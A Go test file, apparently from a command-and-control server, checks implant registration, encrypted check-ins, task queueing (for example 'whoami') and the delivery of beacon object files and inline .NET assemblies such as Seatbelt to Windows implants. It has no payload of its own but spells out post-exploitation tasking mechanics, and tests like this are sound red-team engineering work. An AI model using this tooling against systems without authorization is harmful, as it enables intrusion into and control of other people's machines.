func TestParseWindowsArgLine(t *testing.T) {
	tests := []struct {
		name    string
		raw     string
		want    []string
		wantErr string
	}{
		{
			name: "quoted path and spaced arg",
			raw:  `"C:\Program Files\Tools\run.exe" --name "Spike Spiegel"`,
			want: []string{`C:\Program Files\Tools\run.exe`, "--name", "Spike Spiegel"},
		},
		{
			name: "embedded quotes",
			raw:  `"say \"hello\" to Jet" /quiet`,
			want: []string{`say "hello" to Jet`, "/quiet"},
		},
		{
			name: "doubled quotes inside quoted arg",
			raw:  `"say ""hello"" to Jet" /quiet`,
			want: []string{`say "hello" to Jet`, "/quiet"},
		},
		{
			name: "unterminated quote keeps trailing text",
			raw:  `"C:\Temp\run.exe /flag two`,
			want: []string{`C:\Temp\run.exe /flag two`},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := parseWindowsArgLine(tt.raw)
			if tt.wantErr != "" {
				if err == nil || !strings.Contains(err.Error(), tt.wantErr) {
					t.Fatalf("parseWindowsArgLine error = %v, want substring %q", err, tt.wantErr)
				}
				return
			}
			if err != nil {
				t.Fatalf("parseWindowsArgLine: %v", err)
			}
			if !reflect.DeepEqual(got, tt.want) {
				t.Fatalf("args mismatch: got %#v want %#v", got, tt.want)
			}
		})
	}
}

func TestHandleInlineAssembly_SessionFastPathMarksTaskSentAndFramesPayload(t *testing.T) {
	h, dbPath := newSessionTestHandler(t)
	sessionKey := registerTestBeacon(t, h, 10, 2)
	conn := &fakeConn{localAddr: fakeAddr("local"), remoteAddr: fakeAddr("remote")}
	h.store.RegisterSession(10, conn)

	req := newInlineAssemblyRequest(t, map[string]string{
		"beacon_id": "10",
		"mode":      "bridge",
		"args":      `"arg one" arg2`,
	}, "assembly", "test.exe", []byte("session-asm"))
	w := httptest.NewRecorder()

	h.HandleInlineAssembly(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	if status := fetchTaskStatus(t, dbPath, 10, protocol.TaskBOF); status != models.TaskStatusSent {
		t.Fatalf("task status = %q, want %q", status, models.TaskStatusSent)
	}
	msg := decodeSentTaskEnvelope(t, sessionKey, conn.writeBuf.Bytes())
	if msg.Header.Type != protocol.TaskBOF {
		t.Fatalf("header type = %d, want %d", msg.Header.Type, protocol.TaskBOF)
	}
	if msg.Header.Code != protocol.CodeBOF {
		t.Fatalf("header code = %d, want %d", msg.Header.Code, protocol.CodeBOF)
	}
	if msg.Header.Length != uint32(len(msg.Data)) {
		t.Fatalf("header length = %d, data len = %d", msg.Header.Length, len(msg.Data))
	}
	loaderObj, inlineArgs := decodeBOFReqForTest(t, msg.Data)
	if !isCOFFAMD64(loaderObj) {
		t.Fatalf("loader object is not x64 COFF")
	}
	bridgeBytes, assemblyBytes, args := decodeInlineBOFArgsForTest(t, inlineArgs)
	if len(bridgeBytes) == 0 {
		t.Fatal("expected bridge bytes")
	}
	if string(assemblyBytes) != "session-asm" {
		t.Fatalf("assembly bytes = %q", string(assemblyBytes))
	}
	if !reflect.DeepEqual(args, []string{"arg one", "arg2"}) {
		t.Fatalf("args = %#v", args)
	}
}

func TestHandleInlineAssembly_SessionFastPathSendFailureLeavesTaskPending(t *testing.T) {
	h, dbPath := newSessionTestHandler(t)
	registerTestBeacon(t, h, 11, 2)
	conn := &fakeConn{
		writeErr:   errors.New("boom"),
		localAddr:  fakeAddr("local"),
		remoteAddr: fakeAddr("remote"),
	}
	h.store.RegisterSession(11, conn)

	req := newInlineAssemblyRequest(t, map[string]string{
		"beacon_id": "11",
		"mode":      "bridge",
		"args":      `arg1`,
	}, "assembly", "test.exe", []byte("session-asm"))
	w := httptest.NewRecorder()

	h.HandleInlineAssembly(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	if status := fetchTaskStatus(t, dbPath, 11, protocol.TaskBOF); status != models.TaskStatusPending {
		t.Fatalf("task status = %q, want %q", status, models.TaskStatusPending)
	}
	if conn.writeBuf.Len() != 0 {
		t.Fatalf("expected no captured bytes on write failure, got %d", conn.writeBuf.Len())
	}
}

func TestHandleBOF_SessionFastPathMarksTaskSentAndFramesPayload(t *testing.T) {
	h, dbPath := newSessionTestHandler(t)
	sessionKey := registerTestBeacon(t, h, 12, 2)
	conn := &fakeConn{localAddr: fakeAddr("local"), remoteAddr: fakeAddr("remote")}
	h.store.RegisterSession(12, conn)

	obj := make([]byte, 20)
	binary.LittleEndian.PutUint16(obj[:2], 0x8664)
	req := newBOFRequest(t, map[string]string{
		"beacon_id": "12",
		"args":      `"arg one" two`,
	}, "test.obj", obj)
	w := httptest.NewRecorder()

	h.HandleBOF(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	if status := fetchTaskStatus(t, dbPath, 12, protocol.TaskBOF); status != models.TaskStatusSent {
		t.Fatalf("task status = %q, want %q", status, models.TaskStatusSent)
	}
	msg := decodeSentTaskEnvelope(t, sessionKey, conn.writeBuf.Bytes())
	if msg.Header.Type != protocol.TaskBOF {
		t.Fatalf("header type = %d, want %d", msg.Header.Type, protocol.TaskBOF)
	}
	if msg.Header.Code != protocol.CodeBOF {
		t.Fatalf("header code = %d, want %d", msg.Header.Code, protocol.CodeBOF)
	}
	if msg.Header.Length != uint32(len(msg.Data)) {
		t.Fatalf("header length = %d, data len = %d", msg.Header.Length, len(msg.Data))
	}
	if len(msg.Data) < 8 {
		t.Fatalf("BOF payload too short: %d", len(msg.Data))
	}
	objLen := binary.LittleEndian.Uint32(msg.Data[:4])
	if objLen != uint32(len(obj)) {
		t.Fatalf("obj len = %d, want %d", objLen, len(obj))
	}
	if !bytes.Equal(msg.Data[4:4+objLen], obj) {
		t.Fatalf("object bytes mismatch")
	}
	argsOff := 4 + int(objLen)
	argsLen := binary.LittleEndian.Uint32(msg.Data[argsOff : argsOff+4])
	args := msg.Data[argsOff+4:]
	if argsLen != uint32(len(args)) {
		t.Fatalf("args len = %d, want %d", argsLen, len(args))
	}
	wantArgs := []byte{
		0x07, 0x00, 0x00, 0x00, 'a', 'r', 'g', ' ', 'o', 'n', 'e',
		0x03, 0x00, 0x00, 0x00, 't', 'w', 'o',
	}
	if !bytes.Equal(args, wantArgs) {
		t.Fatalf("args mismatch: got %v want %v", args, wantArgs)
	}
}

func TestHandleBOF_RejectsNonObjectExtension(t *testing.T) {
	h := newTestHandler(t)
	registerTestBeacon(t, h, 13, 2)

	obj := make([]byte, 20)
	binary.LittleEndian.PutUint16(obj[:2], 0x8664)
	req := newBOFRequest(t, map[string]string{
		"beacon_id": "13",
	}, "not-bof.txt", obj)
	w := httptest.NewRecorder()

	h.HandleBOF(w, req)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d", w.Code)
	}
	if !strings.Contains(w.Body.String(), ".o or .obj") {
		t.Fatalf("expected extension error, got %q", w.Body.String())
	}
	if task := h.store.GetNextTask(13); task != nil {
		t.Fatalf("expected no queued task, got %#v", task)
	}
}

func TestHandleInlineAssembly_RejectsLinuxBeacon(t *testing.T) {
	h := newTestHandler(t)
	registerTestBeacon(t, h, 5, 0)

	req := newInlineAssemblyRequest(t, map[string]string{
		"beacon_id": "5",
		"mode":      "auto",
		"args":      `"hello world"`,
	}, "assembly", "test.exe", []byte("asm"))
	w := httptest.NewRecorder()

	h.HandleInlineAssembly(w, req)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d", w.Code)
	}
	if !strings.Contains(w.Body.String(), "Windows") {
		t.Fatalf("expected Windows rejection, got %q", w.Body.String())
	}
}

func TestHandleInlineAssembly_RejectsInvalidMode(t *testing.T) {
	h := newTestHandler(t)
	registerTestBeacon(t, h, 6, 2)

	req := newInlineAssemblyRequest(t, map[string]string{
		"beacon_id": "6",
		"mode":      "weird",
		"args":      `arg1`,
	}, "assembly", "test.exe", []byte("asm"))
	w := httptest.NewRecorder()

	h.HandleInlineAssembly(w, req)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d", w.Code)
	}
	if !strings.Contains(w.Body.String(), "invalid mode") {
		t.Fatalf("expected invalid mode error, got %q", w.Body.String())
	}
}

func TestHandleInlineAssembly_BridgeModeQueuesBridgePayload(t *testing.T) {
	h := newTestHandler(t)
	registerTestBeacon(t, h, 7, 2)

	req := newInlineAssemblyRequest(t, map[string]string{
		"beacon_id": "7",
		"mode":      "bridge",
		"args":      `arg1`,
	}, "assembly", "test.exe", []byte("asm"))
	w := httptest.NewRecorder()

	h.HandleInlineAssembly(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	task := h.store.GetNextTask(7)
	if task == nil {
		t.Fatal("expected queued task")
	}
	if task.Type != protocol.TaskBOF {
		t.Fatalf("task.Type = %d, want %d", task.Type, protocol.TaskBOF)
	}
	loaderObj, inlineArgs := decodeBOFReqForTest(t, task.Data)
	if !isCOFFAMD64(loaderObj) {
		t.Fatalf("loader object is not x64 COFF")
	}
	bridgeBytes, assemblyBytes, args := decodeInlineBOFArgsForTest(t, inlineArgs)
	if len(bridgeBytes) == 0 {
		t.Fatal("expected bridge bytes")
	}
	if string(assemblyBytes) != "asm" {
		t.Fatalf("assembly bytes = %q", string(assemblyBytes))
	}
	if !reflect.DeepEqual(args, []string{"arg1"}) {
		t.Fatalf("args = %#v", args)
	}
}

func TestHandleInlineAssembly_RejectsNonX64WindowsBeacon(t *testing.T) {
	h := newTestHandler(t)
	registerTestBeaconWithArch(t, h, 55, 2, 0)

	req := newInlineAssemblyRequest(t, map[string]string{
		"beacon_id": "55",
		"mode":      "bridge",
	}, "assembly", "Seatbelt.exe", []byte("asm"))
	w := httptest.NewRecorder()

	h.HandleInlineAssembly(w, req)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d", w.Code)
	}
	if !strings.Contains(w.Body.String(), "Windows x64") {
		t.Fatalf("expected x64 rejection, got %q", w.Body.String())
	}
	if task := h.store.GetNextTask(55); task != nil {
		t.Fatalf("expected no queued task, got %#v", task)
	}
}

func TestHandleInlineAssembly_AutoModeQueuesBridgePayload(t *testing.T) {
	h := newTestHandler(t)
	registerTestBeacon(t, h, 8, 2)

	req := newInlineAssemblyRequest(t, map[string]string{
		"beacon_id": "8",
		"mode":      "auto",
		"args":      `"arg one" arg2`,
	}, "assembly", "test.exe", []byte("auto-asm"))
	w := httptest.NewRecorder()

	h.HandleInlineAssembly(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp struct {
		Label      uint32 `json:"label"`
		Status     string `json:"status"`
		Mode       string `json:"mode"`
		BridgeUsed bool   `json:"bridge_used"`
	}
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("Decode response: %v", err)
	}
	if resp.Label == 0 || resp.Status != "queued" || resp.Mode != "bridge" || !resp.BridgeUsed {
		t.Fatalf("unexpected response: %#v", resp)
	}

	task := h.store.GetNextTask(8)
	if task == nil {
		t.Fatal("expected queued task")
	}
	if task.Type != protocol.TaskBOF {
		t.Fatalf("task.Type = %d, want %d", task.Type, protocol.TaskBOF)
	}
	_, inlineArgs := decodeBOFReqForTest(t, task.Data)
	bridgeBytes, assemblyBytes, args := decodeInlineBOFArgsForTest(t, inlineArgs)
	if len(bridgeBytes) == 0 {
		t.Fatal("expected bridge bytes")
	}
	if string(assemblyBytes) != "auto-asm" {
		t.Fatalf("assembly bytes = %q", string(assemblyBytes))
	}
	if !reflect.DeepEqual(args, []string{"arg one", "arg2"}) {
		t.Fatalf("args = %#v", args)
	}
}

func TestHandleInlineAssembly_QueuesTaskFromLibraryAssembly(t *testing.T) {
	h := newTestHandler(t)
	registerTestBeacon(t, h, 9, 2)
	t.Setenv("HOME", t.TempDir())

	if err := os.WriteFile(filepath.Join(h.assemblyDir(), "Seatbelt.exe"), []byte("library-asm"), 0600); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	req := newInlineAssemblyRequest(t, map[string]string{
		"beacon_id":     "9",
		"mode":          "bridge",
		"assembly_name": "Seatbelt.exe",
		"args":          `"C:\Program Files\Seatbelt" "say \"hi\""`,
	}, "", "", nil)
	w := httptest.NewRecorder()

	h.HandleInlineAssembly(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	task := h.store.GetNextTask(9)
	if task == nil {
		t.Fatal("expected queued task")
	}
	if task.Type != protocol.TaskBOF {
		t.Fatalf("task.Type = %d, want %d", task.Type, protocol.TaskBOF)
	}
	if task.Code != protocol.CodeBOF {
		t.Fatalf("task.Code = %d, want %d", task.Code, protocol.CodeBOF)
	}

	_, inlineArgs := decodeBOFReqForTest(t, task.Data)
	bridgeBytes, assemblyBytes, args := decodeInlineBOFArgsForTest(t, inlineArgs)
	if len(bridgeBytes) == 0 {
		t.Fatal("expected bridge bytes")
	}
	if string(assemblyBytes) != "library-asm" {
		t.Fatalf("assembly bytes = %q", string(assemblyBytes))
	}
	wantArgs := []string{`C:\Program Files\Seatbelt`, `say "hi"`}
	if !reflect.DeepEqual(args, wantArgs) {
		t.Fatalf("args = %#v, want %#v", args, wantArgs)
	}
}

func TestHandleRegister(t *testing.T) {
	h, s, priv := setup(t)

	sessionKey := make([]byte, 32)
	rand.Read(sessionKey)

	meta := &models.ImplantMetadata{
		ID:         0xABCD,
		SessionKey: sessionKey,
		Sleep:      5,
		Hostname:   "victim-pc",
	}
	plaintext := protocol.EncodeImplantMetadata(meta)
	encrypted, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, &priv.PublicKey, plaintext, nil)
	if err != nil {
		t.Fatalf("encrypt: %v", err)
	}

	req := httptest.NewRequest("POST", "/api/register", bytes.NewReader(encrypted))
	w := httptest.NewRecorder()
	h.HandleRegister(w, req)

	if w.Code != 200 {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	b := s.GetBeacon(0xABCD)
	if b == nil {
		t.Fatal("beacon not in store after register")
	}
	if b.Hostname != "victim-pc" {
		t.Fatalf("hostname: want victim-pc, got %s", b.Hostname)
	}
}

func TestHandleCheckin_ReturnsEncryptedNOP(t *testing.T) {
	h, s, _ := setup(t)

	sessionKey := make([]byte, 32)
	rand.Read(sessionKey)
	s.RegisterBeacon(&models.ImplantMetadata{ID: 77, SessionKey: sessionKey, Sleep: 5})

	idBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(idBytes, 77)

	req := httptest.NewRequest("POST", "/api/checkin", bytes.NewReader(idBytes))
	w := httptest.NewRecorder()
	h.HandleCheckin(w, req)

	if w.Code != 200 {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	body := w.Body.Bytes()
	// IV(16) + HMAC(32) + AES-CBC(16-byte NOP header padded to 32) = 80 bytes
	if len(body) != 80 {
		t.Fatalf("expected 80 bytes, got %d", len(body))
	}

	plaintext, err := protocol.Decrypt(sessionKey, body)
	if err != nil {
		t.Fatalf("Decrypt: %v", err)
	}
	hdr, err := protocol.DecodeHeader(plaintext)
	if err != nil {
		t.Fatalf("DecodeHeader: %v", err)
	}
	if hdr.Type != protocol.TaskNOP {
		t.Fatalf("expected NOP (0), got type %d", hdr.Type)
	}
}

func TestHandleCheckin_UnknownBeacon(t *testing.T) {
	h, _, _ := setup(t)
	idBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(idBytes, 0xFFFF)

	req := httptest.NewRequest("POST", "/api/checkin", bytes.NewReader(idBytes))
	w := httptest.NewRecorder()
	h.HandleCheckin(w, req)

	if w.Code != 404 {
		t.Fatalf("expected 404, got %d", w.Code)
	}
}

func TestHandleCheckin_BodyTooShort(t *testing.T) {
	h, _, _ := setup(t)
	req := httptest.NewRequest("POST", "/api/checkin", bytes.NewReader([]byte{0x01}))
	w := httptest.NewRecorder()
	h.HandleCheckin(w, req)

	if w.Code != 400 {
		t.Fatalf("expected 400, got %d", w.Code)
	}
}

// Ensure io is used (imported via httptest transitively, but explicit reference avoids lint)
var _ = io.Discard

func TestHandleCheckin_ReturnsTask(t *testing.T) {
	h, s, _ := setup(t)

	sessionKey := make([]byte, 32)
	rand.Read(sessionKey)
	s.RegisterBeacon(&models.ImplantMetadata{ID: 88, SessionKey: sessionKey, Sleep: 5})

	taskData := protocol.EncodeRunReq("whoami")
	s.QueueTask(&models.Task{
		Label:    42,
		BeaconID: 88,
		Type:     protocol.TaskRun,
		Code:     0,
		Data:     taskData,
		Status:   models.TaskStatusPending,
	})

	idBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(idBytes, 88)

	req := httptest.NewRequest("POST", "/api/checkin", bytes.NewReader(idBytes))
	w := httptest.NewRecorder()
	h.HandleCheckin(w, req)

	if w.Code != 200 {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	plaintext, err := protocol.Decrypt(sessionKey, w.Body.Bytes())
	if err != nil {
		t.Fatalf("Decrypt: %v", err)
	}
	if len(plaintext) < 16 {
		t.Fatalf("plaintext too short: %d bytes", len(plaintext))
	}

	hdr, err := protocol.DecodeHeader(plaintext[:16])
	if err != nil {
		t.Fatalf("DecodeHeader: %v", err)
	}
	if hdr.Type != protocol.TaskRun {
		t.Fatalf("expected TaskRun (%d), got %d", protocol.TaskRun, hdr.Type)
	}
	if hdr.Label != 42 {
		t.Fatalf("expected label 42, got %d", hdr.Label)
	}

	cmd, err := protocol.DecodeRunRep(plaintext[16:])
	if err != nil {
		t.Fatalf("DecodeRunRep: %v", err)
	}
	if cmd != "whoami" {
		t.Fatalf("expected whoami, got %q", cmd)
	}
}

func TestHandleResult_ValidPayload(t *testing.T) {
	h, s, _ := setup(t)

	sessionKey := make([]byte, 32)
	rand.Read(sessionKey)
	s.RegisterBeacon(&models.ImplantMetadata{ID: 99, SessionKey: sessionKey, Sleep: 5})
	s.QueueTask(&models.Task{Label: 7, BeaconID: 99, Type: 12, Status: models.TaskStatusPending})
	s.GetNextTask(99) // marks SENT

	hdr := protocol.EncodeHeader(protocol.TaskHeader{Type: 12, Label: 7})
	output := protocol.EncodeRunReq("operator\n")
	plaintext := append(hdr, output...)

	encrypted, err := protocol.Encrypt(sessionKey, plaintext)
	if err != nil {
		t.Fatalf("Encrypt: %v", err)
	}

	body := make([]byte, 4+len(encrypted))
	binary.LittleEndian.PutUint32(body[:4], 99)
	copy(body[4:], encrypted)

	req := httptest.NewRequest("POST", "/api/result", bytes.NewReader(body))
	w := httptest.NewRecorder()
	h.HandleResult(w, req)

	if w.Code != 200 {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	results := s.GetResults(99)
	if len(results) != 1 {
		t.Fatalf("expected 1 result, got %d", len(results))
	}
	if results[0].Output != "operator\n" {
		t.Fatalf("output mismatch: got %q", results[0].Output)
	}
}

func TestHandleResult_InlineAssemblyStoresStructuredResultAndPublishesEvent(t *testing.T) {
	key, err := protocol.GenerateRSAKey()
	if err != nil {
		t.Fatalf("GenerateRSAKey: %v", err)
	}
	s, dbPath := newTestStoreWithPath(t)
	hub := NewHub()
	h := NewHandler(s, key, "", &noopLM{}, &nopPersister{}, 0, nil, hub, nil, nil, nil)

	sessionKey := make([]byte, 32)
	rand.Read(sessionKey)
	s.RegisterBeacon(&models.ImplantMetadata{ID: 120, SessionKey: sessionKey, Sleep: 5})
	s.QueueTask(&models.Task{Label: 77, BeaconID: 120, Type: protocol.TaskInlineAssembly, Status: models.TaskStatusPending})
	s.GetNextTask(120)

	events := hub.Subscribe()
	defer hub.Unsubscribe(events)

	inline := protocol.InlineAssemblyResult{
		ExitCode:      -7,
		DurationMS:    1234,
		Truncated:     true,
		Stdout:        "stdout text",
		Stderr:        "stderr text",
		Exception:     "exception text",
		Mode:          "bridge",
		BridgeVersion: "1.2.3",
		Diagnostics:   "diag text",
	}
	payload := protocol.EncodeInlineAssemblyResult(inline)
	hdr := protocol.EncodeHeader(protocol.TaskHeader{
		Type:   protocol.TaskInlineAssembly,
		Flags:  3,
		Label:  77,
		Length: uint32(len(payload)),
	})
	plaintext := append(hdr, payload...)

	encrypted, err := protocol.Encrypt(sessionKey, plaintext)
	if err != nil {
		t.Fatalf("Encrypt: %v", err)
	}

	body := make([]byte, 4+len(encrypted))
	binary.LittleEndian.PutUint32(body[:4], 120)
	copy(body[4:], encrypted)

	req := httptest.NewRequest(http.MethodPost, "/api/result", bytes.NewReader(body))
	w := httptest.NewRecorder()
	h.HandleResult(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	if status := fetchTaskStatus(t, dbPath, 120, protocol.TaskInlineAssembly); status != models.TaskStatusCompleted {
		t.Fatalf("task status = %s, want %s", status, models.TaskStatusCompleted)
	}

	results := s.GetResults(120)
	if len(results) != 1 {
		t.Fatalf("expected 1 result, got %d", len(results))
	}

	got := results[0]
	if got.Type != protocol.TaskInlineAssembly {
		t.Fatalf("type = %d, want %d", got.Type, protocol.TaskInlineAssembly)
	}
	if got.Flags != 3 {
		t.Fatalf("flags = %d, want 3", got.Flags)
	}
	if got.ExitCode != inline.ExitCode || got.DurationMS != inline.DurationMS || got.Truncated != inline.Truncated {
		t.Fatalf("inline metadata mismatch: %#v", got)
	}
	if got.Stdout != inline.Stdout || got.Stderr != inline.Stderr || got.Exception != inline.Exception {
		t.Fatalf("inline streams mismatch: %#v", got)
	}
	if got.Mode != inline.Mode || got.BridgeVersion != inline.BridgeVersion || got.Diagnostics != inline.Diagnostics {
		t.Fatalf("inline mode mismatch: %#v", got)
	}
	for _, want := range []string{
		"Exit Code: -7",
		"Duration: 1234 ms",
		"Truncated: true",
		"Stdout:\nstdout text",
		"Stderr:\nstderr text",
		"Exception:\nexception text",
		"Diagnostics:\ndiag text",
	} {
		if !strings.Contains(got.Output, want) {
			t.Fatalf("output missing %q in %q", want, got.Output)
		}
	}

	evt := waitForHubEvent(t, events, "results", "add")
	data, ok := evt.Data.(map[string]interface{})
	if !ok {
		t.Fatalf("event data type = %T, want map[string]interface{}", evt.Data)
	}
	if data["type"] != protocol.TaskInlineAssembly {
		t.Fatalf("event type = %#v, want %d", data["type"], protocol.TaskInlineAssembly)
	}
	if data["output"] != got.Output {
		t.Fatalf("event output = %#v, want %q", data["output"], got.Output)
	}
	if data["mode"] != inline.Mode || data["bridge_version"] != inline.BridgeVersion {
		t.Fatalf("event inline mode data = %#v", data)
	}
	if data["stdout"] != inline.Stdout || data["stderr"] != inline.Stderr || data["exception"] != inline.Exception || data["diagnostics"] != inline.Diagnostics {
		t.Fatalf("event inline text data = %#v", data)
	}
	if data["exit_code"] != inline.ExitCode || data["duration_ms"] != inline.DurationMS || data["truncated"] != inline.Truncated {
		t.Fatalf("event inline metadata = %#v", data)
	}
}

func TestHandleResult_InlineAssemblyBOFStoresStructuredTextResult(t *testing.T) {
	key, err := protocol.GenerateRSAKey()
	if err != nil {
		t.Fatalf("GenerateRSAKey: %v", err)
	}
	s, dbPath := newTestStoreWithPath(t)
	hub := NewHub()
	h := NewHandler(s, key, "", &noopLM{}, &nopPersister{}, 0, nil, hub, nil, nil, nil)

	sessionKey := make([]byte, 32)
	rand.Read(sessionKey)
	s.RegisterBeacon(&models.ImplantMetadata{ID: 122, SessionKey: sessionKey, Sleep: 5})
	s.QueueTask(&models.Task{
		Label:      79,
		BeaconID:   122,
		Type:       protocol.TaskBOF,
		Identifier: inlineAssemblyBOFIdentifier,
		Status:     models.TaskStatusPending,
	})
	s.GetNextTask(122)

	events := hub.Subscribe()
	defer hub.Unsubscribe(events)

	output := "[inline-assembly]\r\nExit: 3\r\nDuration: 44ms\r\nTruncated: false\r\n\r\nSTDOUT:\r\nhello\r\n\r\nSTDERR:\r\nwarn\r\n\r\nDIAGNOSTICS:\r\nok\r\n"
	payload := protocol.EncodeRunReq(output)
	hdr := protocol.EncodeHeader(protocol.TaskHeader{
		Type:   protocol.TaskBOF,
		Flags:  0,
		Label:  79,
		Length: uint32(len(payload)),
	})
	plaintext := append(hdr, payload...)
	encrypted, err := protocol.Encrypt(sessionKey, plaintext)
	if err != nil {
		t.Fatalf("Encrypt: %v", err)
	}

	body := make([]byte, 4+len(encrypted))
	binary.LittleEndian.PutUint32(body[:4], 122)
	copy(body[4:], encrypted)

	req := httptest.NewRequest(http.MethodPost, "/api/result", bytes.NewReader(body))
	w := httptest.NewRecorder()
	h.HandleResult(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	if status := fetchTaskStatus(t, dbPath, 122, protocol.TaskBOF); status != models.TaskStatusCompleted {
		t.Fatalf("task status = %s, want %s", status, models.TaskStatusCompleted)
	}
	results := s.GetResults(122)
	if len(results) != 1 {
		t.Fatalf("expected 1 result, got %d", len(results))
	}
	got := results[0]
	if got.Type != protocol.TaskInlineAssembly {
		t.Fatalf("type = %d, want %d", got.Type, protocol.TaskInlineAssembly)
	}
	if got.ExitCode != 3 || got.DurationMS != 44 || got.Truncated {
		t.Fatalf("metadata mismatch: %#v", got)
	}
	if got.Stdout != "hello" || got.Stderr != "warn" || got.Diagnostics != "ok" {
		t.Fatalf("stream mismatch: %#v", got)
	}
	if got.Output != output {
		t.Fatalf("output = %q, want original text", got.Output)
	}

	evt := waitForHubEvent(t, events, "results", "add")
	data, ok := evt.Data.(map[string]interface{})
	if !ok {
		t.Fatalf("event data type = %T", evt.Data)
	}
	if data["type"] != protocol.TaskInlineAssembly || data["stdout"] != "hello" {
		t.Fatalf("event mismatch: %#v", data)
	}
}

func TestReadInlineAssemblySourceRejectsOversizedLibraryAssembly(t *testing.T) {
	h, _, _ := setup(t)
	t.Setenv("BEBOP_LIBRARY_DIR", t.TempDir())
	assemblyDir := h.assemblyDir()
	if err := os.WriteFile(filepath.Join(assemblyDir, "large.exe"), bytes.Repeat([]byte{'M'}, int(maxInlineAssemblyFileBytes)+1), 0600); err != nil {
		t.Fatal(err)
	}

	req := newInlineAssemblyRequest(t, map[string]string{"assembly_name": "large.exe"}, "", "", nil)
	_, err := h.readInlineAssemblySource(req)
	if err == nil || err.Error() != "assembly too large" {
		t.Fatalf("err = %v, want assembly too large", err)
	}
}

func TestHandleResult_InlineAssemblyDecodeFailureStoresFallbackAndCompletesTask(t *testing.T) {
	key, err := protocol.GenerateRSAKey()
	if err != nil {
		t.Fatalf("GenerateRSAKey: %v", err)
	}
	s, dbPath := newTestStoreWithPath(t)
	hub := NewHub()
	h := NewHandler(s, key, "", &noopLM{}, &nopPersister{}, 0, nil, hub, nil, nil, nil)

	sessionKey := make([]byte, 32)
	rand.Read(sessionKey)
	s.RegisterBeacon(&models.ImplantMetadata{ID: 121, SessionKey: sessionKey, Sleep: 5})
	s.QueueTask(&models.Task{Label: 78, BeaconID: 121, Type: protocol.TaskInlineAssembly, Status: models.TaskStatusPending})
	s.GetNextTask(121)

	events := hub.Subscribe()
	defer hub.Unsubscribe(events)

	payload := []byte{0x01, 0x02, 0x03}
	hdr := protocol.EncodeHeader(protocol.TaskHeader{
		Type:   protocol.TaskInlineAssembly,
		Flags:  9,
		Label:  78,
		Length: uint32(len(payload)),
	})
	plaintext := append(hdr, payload...)

	encrypted, err := protocol.Encrypt(sessionKey, plaintext)
	if err != nil {
		t.Fatalf("Encrypt: %v", err)
	}

	body := make([]byte, 4+len(encrypted))
	binary.LittleEndian.PutUint32(body[:4], 121)
	copy(body[4:], encrypted)

	req := httptest.NewRequest(http.MethodPost, "/api/result", bytes.NewReader(body))
	w := httptest.NewRecorder()
	h.HandleResult(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	if status := fetchTaskStatus(t, dbPath, 121, protocol.TaskInlineAssembly); status != models.TaskStatusCompleted {
		t.Fatalf("task status = %s, want %s", status, models.TaskStatusCompleted)
	}

	results := s.GetResults(121)
	if len(results) != 1 {
		t.Fatalf("expected 1 result, got %d", len(results))
	}

	got := results[0]
	if got.Type != protocol.TaskInlineAssembly || got.Flags != 9 {
		t.Fatalf("identity mismatch: %#v", got)
	}
	if got.ExitCode != -1 {
		t.Fatalf("exit code = %d, want -1", got.ExitCode)
	}
	if got.Mode != "decode-error" {
		t.Fatalf("mode = %q, want decode-error", got.Mode)
	}
	if !strings.Contains(got.Exception, "DecodeInlineAssemblyResult") {
		t.Fatalf("exception = %q", got.Exception)
	}
	for _, want := range []string{"Exit Code: -1", "Exception:", "DecodeInlineAssemblyResult"} {
		if !strings.Contains(got.Output, want) {
			t.Fatalf("output missing %q in %q", want, got.Output)
		}
	}

	evt := waitForHubEvent(t, events, "results", "add")
	data, ok := evt.Data.(map[string]interface{})
	if !ok {
		t.Fatalf("event data type = %T, want map[string]interface{}", evt.Data)
	}
	if data["exit_code"] != int32(-1) || data["mode"] != "decode-error" {
		t.Fatalf("event fallback fields = %#v", data)
	}
	if !strings.Contains(data["exception"].(string), "DecodeInlineAssemblyResult") {
		t.Fatalf("event exception = %#v", data["exception"])
	}
}

func TestHandleResult_BadHMAC(t *testing.T) {
	h, s, _ := setup(t)

	sessionKey := make([]byte, 32)
	rand.Read(sessionKey)
	s.RegisterBeacon(&models.ImplantMetadata{ID: 100, SessionKey: sessionKey, Sleep: 5})

	body := make([]byte, 4+80)
	binary.LittleEndian.PutUint32(body[:4], 100)
	rand.Read(body[4:]) // garbage encrypted payload

	req := httptest.NewRequest("POST", "/api/result", bytes.NewReader(body))
	w := httptest.NewRecorder()
	h.HandleResult(w, req)

	if w.Code != 400 {
		t.Fatalf("expected 400, got %d", w.Code)
	}
}

func TestHandleResult_UnknownBeacon(t *testing.T) {
	h, _, _ := setup(t)

	body := make([]byte, 4)
	binary.LittleEndian.PutUint32(body, 0xDEAD)

	req := httptest.NewRequest("POST", "/api/result", bytes.NewReader(body))
